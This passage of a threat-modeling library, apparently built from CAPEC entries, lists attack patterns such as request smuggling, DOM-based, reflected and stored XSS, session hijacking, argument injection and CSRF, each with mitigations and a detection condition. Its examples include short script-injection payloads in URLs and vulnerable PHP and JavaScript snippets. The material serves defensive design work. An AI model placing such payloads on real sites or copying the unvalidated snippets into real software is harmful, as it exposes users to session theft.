  <dd>When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088</dd>

  <dt>Mitigations</dt>
  <dd>HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/33.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False</dd>
</dl>



## INP38 DOM-Based XSS

This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>An application that leverages a client-side web browser with scripting enabled.An application that manipulates the DOM via client-side scripting.An application that fails to adequately sanitize or encode untrusted input.</dd>

  <dt>Example</dt>
  <dd>Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s client-side code may want to print this mode value to the screen to give the users an understanding of what mode they are in. In this example, JavaScript is used to pull the value from the URL and update the HTML by dynamically manipulating the DOM via a document.write() call. <script>document.write(<p>Mode is: + document.location.href.substring(document.location.href.indexOf('mode=') + 5) + </p>);</script> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>In some DOM-based attacks, the malicious script never gets sent to the web server at all, thus bypassing any server-side protections that might be in place. Consider the previously used web application that displays the mode value. Since the HTML is being generated dynamically through DOM manipulations, a URL fragment (i.e., the part of a URL after the '#' character) can be used. http://my.site.com/aform.html#mode=<script>alert('hi')</script> In this variation of a DOM-based XSS attack, the malicious script will not be sent to the web server, but will instead be managed by the victim's browser and is still available to the client-side script code.</dd>

  <dt>Mitigations</dt>
  <dd>Use browser technologies that do not allow client-side scripting.Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.Ensure that all user-supplied input is validated before use.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/588.html</dd>

  <dt>Condition</dt>
  <dd>target.allowsClientSideScripting is True and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)</dd>
</dl>



## AC16 Session Credential Falsification through Prediction

This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target host uses session IDs to keep track of the users.Session IDs are used to control access to resources.The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time).</dd>

  <dt>Example</dt>
  <dd>Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534</dd>

  <dt>Mitigations</dt>
  <dd>Use a strong source of randomness to generate a session ID.Use adequate length session IDs. Do not use information available to the user in order to generate session ID (e.g., time).Ideas for creating random numbers are offered by Eastlake [RFC1750]. Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/59.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.usesStrongSessionIdentifiers is False</dd>
</dl>



## INP39 Reflected XSS

This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is “reflected” off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application. The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>An application that leverages a client-side web browser with scripting enabled.An application that fail to adequately sanitize or encode untrusted input.</dd>

  <dt>Example</dt>
  <dd>Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s server-side code may want to display this mode value in the HTML page being created to give the users an understanding of what mode they are in. In this example, PHP is used to pull the value from the URL and generate the desired HTML. <?phpecho 'Mode is: ' . $_GET[mode];?> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>Reflected XSS attacks can take advantage of HTTP headers to compromise a victim. For example, assume a vulnerable web application called ‘mysite’ dynamically generates a link using an HTTP header such as HTTP_REFERER. Code somewhere in the application could look like: <?phpecho <a href=”$_SERVER[‘HTTP_REFERER’]”>Test URL</a>?> The HTTP_REFERER header is populated with the URI that linked to the currently executing page. A web site can be created and hosted by an adversary that takes advantage of this by adding a reference to the vulnerable web application. By tricking a victim into clicking a link that executes the attacker’s web page, such as: http://attackerswebsite.com?<script>malicious content</script> The vulnerable web application (‘mysite’) is now called via the attacker’s web site, initiated by the victim’s web browser. The HTTP_REFERER header will contain a malicious script, which is embedded into the page by the vulnerable application and served to the victim. The victim’s web browser then executes the injected script, thus compromising the victim’s machine.</dd>

  <dt>Mitigations</dt>
  <dd>Use browser technologies that do not allow client-side scripting.Utilize strict type, character, and encoding enforcement.Ensure that all user-supplied input is validated before use.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/591.html</dd>

  <dt>Condition</dt>
  <dd>target.allowsClientSideScripting is True and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)</dd>
</dl>



## INP40 Stored XSS

This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly “stored” within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>An application that leverages a client-side web browser with scripting enabled.An application that fails to adequately sanitize or encode untrusted input.An application that stores information provided by the user in data storage of some kind.</dd>

  <dt>Example</dt>
  <dd>An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of his message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser.</dd>

  <dt>Mitigations</dt>
  <dd>Use browser technologies that do not allow client-side scripting.Utilize strict type, character, and encoding enforcement.Ensure that all user-supplied input is validated before being stored.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/592.html</dd>

  <dt>Condition</dt>
  <dd>target.allowsClientSideScripting is True and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)</dd>
</dl>



## AC17 Session Hijacking - ServerSide

This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>An application that leverages sessions to perform authentication.</dd>

  <dt>Example</dt>
  <dd>Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim’s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.</dd>

  <dt>Mitigations</dt>
  <dd>Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/593.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.usesStrongSessionIdentifiers is False</dd>
</dl>



## AC18 Session Hijacking - ClientSide

This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>An application that leverages sessions to perform authentication.</dd>

  <dt>Example</dt>
  <dd>Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim’s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.</dd>

  <dt>Mitigations</dt>
  <dd>Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/593.html</dd>

  <dt>Condition</dt>
  <dd>(target.controls.usesStrongSessionIdentifiers is False or target.controls.encryptsCookies is False) and target.controls.definesConnectionTimeout is False</dd>
</dl>



## INP41 Argument Injection

An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.</dd>

  <dt>Example</dt>
  <dd>A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]</dd>

  <dt>Mitigations</dt>
  <dd>Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/6.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## AC19 Reusing Session IDs (aka Session Replay) - ServerSide

This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target host uses session IDs to keep track of the users.Session IDs are used to control access to resources.The session IDs used by the target host are not well protected from session theft.</dd>

  <dt>Example</dt>
  <dd>OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258</dd>

  <dt>Mitigations</dt>
  <dd>Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/60.html</dd>

  <dt>Condition</dt>
  <dd>target.usesSessionTokens is True and target.controls.implementsNonce is False</dd>
</dl>



## AC20 Reusing Session IDs (aka Session Replay) - ClientSide

This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target host uses session IDs to keep track of the users.Session IDs are used to control access to resources.The session IDs used by the target host are not well protected from session theft.</dd>

  <dt>Example</dt>
  <dd>OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258</dd>

  <dt>Mitigations</dt>
  <dd>Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/60.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.definesConnectionTimeout is False and (target.controls.usesMFA is False or target.controls.encryptsSessionData is False)</dd>
</dl>



## AC21 Cross Site Request Forgery

An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd></dd>

  <dt>Example</dt>
  <dd>While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.</dd>

  <dt>Mitigations</dt>
  <dd>Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/62.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsCSRFToken is False or target.controls.verifySessionIdentifiers is False</dd>
</dl>



## DS06 Data Leak

An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd></dd>

  <dt>Example</dt>
  <dd>An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.</dd>

  <dt>Mitigations</dt>
  <dd>All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.</dd>

  <dt>References</dt>
  <dd>https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html</dd>

  <dt>Condition</dt>
  <dd>target.hasDataLeaks()</dd>
</dl>



## DR01 Unprotected Sensitive Data

An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd></dd>

  <dt>Example</dt>
  <dd></dd>

  <dt>Mitigations</dt>
  <dd>All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.</dd>

  <dt>References</dt>
  <dd>https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html</dd>

  <dt>Condition</dt>
  <dd>(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))</dd>
</dl>



## AC22 Credentials Aging

If no mechanism is in place for managing credentials (passwords and certificates) aging, users will have no incentive to update passwords or rotate certificates in a timely manner. Allowing password aging to occur unchecked or long certificate expiration dates can result in the possibility of diminished password integrity.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd></dd>

  <dt>Example</dt>
  <dd></dd>

  <dt>Mitigations</dt>
  <dd>All passwords and other credentials should have a relatively short expiration date with a possibility to be revoked immediately under special circumstances.</dd>

  <dt>References</dt>
  <dd>https://cwe.mitre.org/data/definitions/262.html, https://cwe.mitre.org/data/definitions/263.html, https://cwe.mitre.org/data/definitions/798.html</dd>

  <dt>Condition</dt>
  <dd>any(d.isCredentials for d in target.data) and target.sink.inScope and any(d.credentialsLife in (Lifetime.UNKNOWN, Lifetime.LONG, Lifetime.MANUAL, Lifetime.HARDCODED) for d in target.data)</dd>
</dl>



